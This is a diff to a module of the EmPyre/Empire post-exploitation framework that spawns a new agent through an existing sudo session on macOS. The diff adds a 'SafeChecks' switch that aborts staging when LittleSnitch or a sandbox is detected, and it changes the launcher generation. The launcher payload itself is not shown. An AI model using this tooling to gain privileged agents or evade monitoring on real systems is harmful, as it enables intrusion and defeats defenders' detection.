@@ -14,7 +14,7 @@ class Module:
             'Author': ['@n00py'],
 
             # more verbose multi-line description of the module
-            'Description': ('Spawns a new EmPyre agent using an existing sudo session.'),
+            'Description': ('Spawns a new EmPyre agent using an existing sudo session.  This works up until El Capitan.'),
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -52,6 +52,11 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   ''
             },
+            'SafeChecks': {
+                'Description': 'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
+                'Required': True,
+                'Value': 'True'
+            },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                 'Required'      :   False,
@@ -79,13 +84,11 @@ class Module:
         # extract all of our options
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
-        isEmpire = self.mainMenu.listeners.is_listener_empyre(listenerName)
-        if not isEmpire:
-            print helpers.color("[!] EmPyre listener required!")
-            return ""
+        safeChecks = self.options['SafeChecks']['Value']
+
 
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent)
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)
 
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
